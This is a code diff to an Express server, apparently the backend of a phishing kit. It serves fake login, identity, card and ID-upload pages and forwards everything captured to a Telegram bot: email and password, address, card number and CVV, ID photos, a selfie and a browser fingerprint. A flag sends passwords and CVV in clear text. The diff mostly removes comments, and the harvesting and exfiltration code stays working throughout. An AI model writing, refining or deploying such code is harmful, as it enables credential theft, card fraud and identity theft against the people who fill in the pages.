@@ -2,8 +2,8 @@
  * serve.js — 4 pages + form/upload relay to Telegram
  * Node 18+ (global fetch / FormData / Blob)
  *
- *   npm i express multer
- *   TELEGRAM_BOT_TOKEN=123:ABC TELEGRAM_CHAT_ID=123456789 node serve.js
+ *   npm install
+ *   TELEGRAM_BOT_TOKEN=123:ABC TELEGRAM_CHAT_ID=123456789 npm start
  *
  * Pages:  /          -> page 1  login      (public/index.html)
  *         /identity  -> page 2  identity   (public/identity.html)
@@ -21,24 +21,16 @@ const PORT      = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
 
-const MAX_FILE_MB = 50;   // Telegram Bot API document limit
-const MAX_FILES   = 12;   // room for front + back + selfie (and retries)
+const MAX_FILE_MB = 50;
+const MAX_FILES   = 12;
 
-// false = send passwords/CVV in clear text, true = send ••••••
-const MASK_SENSITIVE = false;
+const MASK_SENSITIVE = false;   // true = hide password/CVV in Telegram
 
 if (!BOT_TOKEN || !CHAT_ID) {
   console.warn('[warn] TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not set — submissions will fail.');
 }
 
 /* ------------------------- file slot definitions ---------------------- */
-/**
- * Each `setupFileUpload(inputId, zoneId, previewId, isSelfie)` in the
- * frontend corresponds to a slot below.
- *
- *   name  -> the HTML <input name="..."> (and FormData key)
- *   label -> shown in the Telegram caption
- */
 const UPLOAD_SLOTS = [
   { name: 'front',  label: 'Front',  isSelfie: false },
   { name: 'back',   label: 'Back',   isSelfie: false },
@@ -46,13 +38,11 @@ const UPLOAD_SLOTS = [
 ];
 
 /* ------------------------- field definitions -------------------------- */
-// Page 1 — Login
 const LOGIN_FIELDS = [
   { name: 'email',    label: 'Email',    required: true },
   { name: 'password', label: 'Password', required: true, mask: true },
 ];
 
-// Page 2 — Identity
 const IDENTITY_FIELDS = [
   { name: 'fullName', label: 'Full Name',         required: true },
   { name: 'address1', label: 'Address Line 1',    required: true },
@@ -63,7 +53,6 @@ const IDENTITY_FIELDS = [
   { name: 'country',  label: 'Country',           required: true },
 ];
 
-// Page 3 — Card
 const CARD_FIELDS = [
   { name: 'fullName',         label: 'Cardholder Name',   required: true },
   { name: 'cardNumber',       label: 'Card Number',       required: true },
@@ -76,7 +65,6 @@ const CARD_FIELDS = [
   { name: 'screenResolution', label: 'Screen Resolution', required: false },
 ];
 
-// Page 4 — ID card upload metadata
 const ID_UPLOAD_META = [
   { name: 'documentType', label: 'Document Type', required: true },
 ];
@@ -85,10 +73,9 @@ const ID_UPLOAD_META = [
 const app = express();
 app.disable('x-powered-by');
 app.set('trust proxy', true);
-app.use(express.json({ limit: '25mb' }));   // base64 uploads can be big
+app.use(express.json({ limit: '25mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// ---- multer: accept all slots + a generic `files` field ----
 const upload = multer({
   storage: multer.memoryStorage(),
   limits: { fileSize: MAX_FILE_MB * 1024 * 1024, files: MAX_FILES },
@@ -200,7 +187,6 @@ function renderMessage(title, fields, values, req, extraLines = []) {
   return lines.join('\n');
 }
 
-/** Convert a base64 data-URL / raw base64 payload into a multer-style file. */
 function decodeBase64File(entry) {
   if (!entry || !entry.data) return null;
   const raw  = String(entry.data);
@@ -219,10 +205,10 @@ function decodeBase64File(entry) {
 
 /* ------------------------------ pages --------------------------------- */
 const PAGES = {
-  '/':         'index.html',     // page 1 — Login
-  '/identity': 'identity.html',  // page 2 — Identity
-  '/card':     'card.html',      // page 3 — Card
-  '/upload':   'upload.html',    // page 4 — ID card upload
+  '/':         'index.html',
+  '/identity': 'identity.html',
+  '/card':     'card.html',
+  '/upload':   'upload.html',
 };
 
 for (const [route, file] of Object.entries(PAGES)) {
@@ -354,36 +340,13 @@ app.post('/api/card', async (req, res, next) => {
 });
 
 /* --------------------------- Page 4 — ID upload ----------------------- */
-/**
- * Handles the multi-input file upload from:
- *
- *   setupFileUpload(inputId, zoneId, previewId, isSelfie) {
- *     const fileInput   = document.getElementById(inputId);
- *     const uploadZone  = document.getElementById(zoneId);
- *     const previewArea = document.getElementById(previewId);
- *     ...
- *   }
- *
- * Accepts EITHER:
- *   A) multipart/form-data with named slots:
- *      front, back, selfie   (each <input name="front|back|selfie">)
- *      + documentType, hasSelfie, timestamp, userAgent, Fingerprint, csrf_token
- *
- *   B) multipart/form-data with generic files[] + metadata
- *
- *   C) JSON body: { documentType, files: { front: {name,type,data},
- *                                         back:  {name,type,data},
- *                                         selfie:{name,type,data} },
- *                   hasSelfie, timestamp, userAgent }
- */
 app.post(
   '/api/id-upload',
-  upload,   // <-- multer.fields(...) — accepts all named slots
+  upload,
   async (req, res, next) => {
     try {
       const body = req.body || {};
 
-      // ---- 1. Metadata ----
       const { values: meta, missing } = readForm(body, ID_UPLOAD_META);
       if (missing.length) {
         return respond(req, res, 400, {
@@ -393,26 +356,16 @@ app.post(
         });
       }
 
-      // ---- 2. Collect files per slot ----
-      // multer gives us req.files as { front:[...], back:[...], selfie:[...], files:[...] }
-      const collected = [];
-
+      const collected   = [];
       const multerFiles = req.files || {};
 
-      // 2a. Named slots
       for (const slot of UPLOAD_SLOTS) {
         const arr = multerFiles[slot.name] || [];
         for (const f of arr) {
-          collected.push({
-            slot:     slot.name,
-            label:    slot.label,
-            isSelfie: slot.isSelfie,
-            file:     f,
-          });
+          collected.push({ slot: slot.name, label: slot.label, isSelfie: slot.isSelfie, file: f });
         }
       }
 
-      // 2b. Generic `files[]`
       for (const f of multerFiles.files || []) {
         const guess = UPLOAD_SLOTS.find((s) => new RegExp(s.name, 'i').test(f.originalname));
         collected.push({
@@ -423,22 +376,15 @@ app.post(
         });
       }
 
-      // 2c. JSON base64 — files: { front:{...}, back:{...}, selfie:{...} }
       if (!collected.length && body.files && !Array.isArray(body.files) && typeof body.files === 'object') {
         for (const slot of UPLOAD_SLOTS) {
           const decoded = decodeBase64File(body.files[slot.name]);
           if (decoded) {
-            collected.push({
-              slot:     slot.name,
-              label:    slot.label,
-              isSelfie: slot.isSelfie,
-              file:     decoded,
-            });
+            collected.push({ slot: slot.name, label: slot.label, isSelfie: slot.isSelfie, file: decoded });
           }
         }
       }
 
-      // 2d. JSON base64 — files: [{ name, type, data }]
       if (!collected.length && Array.isArray(body.files)) {
         for (const entry of body.files) {
           const decoded = decodeBase64File(entry);
@@ -457,19 +403,13 @@ app.post(
         return respond(req, res, 400, { ok: false, error: 'No files received.' });
       }
 
-      // ---- 3. Build verificationData (same shape as frontend) ----
       const presentSlots = {};
       for (const s of UPLOAD_SLOTS) {
         presentSlots[s.name] = collected.some((c) => c.slot === s.name);
       }
 
-      const userAgent = String(
-        body.userAgent || req.get('user-agent') || ''
-      ).slice(0, 500);
-
-      const fingerprint = String(
-        body.Fingerprint || body.fingerprint || ''
-      ).slice(0, 500);
+      const userAgent = String(body.userAgent || req.get('user-agent') || '').slice(0, 500);
+      const fingerprint = String(body.Fingerprint || body.fingerprint || '').slice(0, 500);
 
       const hasSelfie =
         presentSlots.selfie ||
@@ -482,11 +422,10 @@ app.post(
         hasSelfie:    hasSelfie,
         timestamp:    String(body.timestamp || new Date().toISOString()).slice(0, 64),
         userAgent:    userAgent,
-        slots:        presentSlots,   // { front: true, back: true, selfie: false }
+        slots:        presentSlots,
       };
       if (fingerprint) verificationData.Fingerprint = fingerprint;
 
-      // ---- 4. Header message ----
       const slotLine = UPLOAD_SLOTS
         .map((s) => `${presentSlots[s.name] ? '✅' : '⬜'} ${s.label}`)
         .join('  •  ');
@@ -506,7 +445,6 @@ app.post(
 
       await tgSendText(header);
 
-      // ---- 5. Send each file with a slot-labelled caption ----
       let sent = 0;
       for (const c of collected) {
         const f = c.file;
@@ -523,7 +461,6 @@ app.post(
         `slots=${Object.entries(presentSlots).filter(([, v]) => v).map(([k]) => k).join('+') || 'none'}`
       );
 
-      // ---- 6. Respond ----
       respond(req, res, 200, {
         ok: true,
         sent,
